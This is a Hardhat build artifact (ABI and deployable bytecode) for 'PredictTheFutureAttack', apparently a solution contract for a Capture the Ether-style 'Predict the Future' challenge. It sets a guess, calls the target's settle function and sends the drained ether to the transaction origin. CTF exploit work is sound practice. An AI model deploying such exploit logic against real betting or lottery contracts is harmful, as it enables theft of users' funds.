{
  "_format": "hh-sol-artifact-1",
  "contractName": "PredictTheFutureAttack",
  "sourceName": "contracts/attacks/PredictTheFutureAttack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_predictTheFutureAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "predictTheFuture",
      "outputs": [
        {
          "internalType": "contract IPredictTheFuture",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint8",
          "name": "n",
          "type": "uint8"
        }
      ],
      "name": "setGuess",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161033d38038061033d83398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b6102aa806100936000396000f3fe6080604052600436106100385760003560e01c80631f6699b91461004457806356e1479a146100815780639e5faafc1461009657600080fd5b3661003f57005b600080fd5b34801561005057600080fd5b50600054610064906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b61009461008f36600461024a565b6100ae565b005b61009e610133565b6040519015158152602001610078565b6000546040517f56e1479a00000000000000000000000000000000000000000000000000000000815260ff831660048201526001600160a01b03909116906356e1479a90662386f26fc10000906024016000604051808303818588803b15801561011757600080fd5b505af115801561012b573d6000803e3d6000fd5b505050505050565b60008060009054906101000a90046001600160a01b03166001600160a01b0316634fb602516040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561018457600080fd5b505af1158015610198573d6000803e3d6000fd5b50506000546001600160a01b0316311591506102169050576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601760248201527f4368616c6c656e6765206e6f7420636f6d706c65746564000000000000000000604482015260640160405180910390fd5b60405132904780156108fc02916000818181858888f19350505050158015610242573d6000803e3d6000fd5b506001905090565b60006020828403121561025c57600080fd5b813560ff8116811461026d57600080fd5b939250505056fea2646970667358221220e55a3de06bf985f2affb11aaf337f5c2617a7002884fdb4da9ab6639df5cac2d64736f6c634300080c0033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}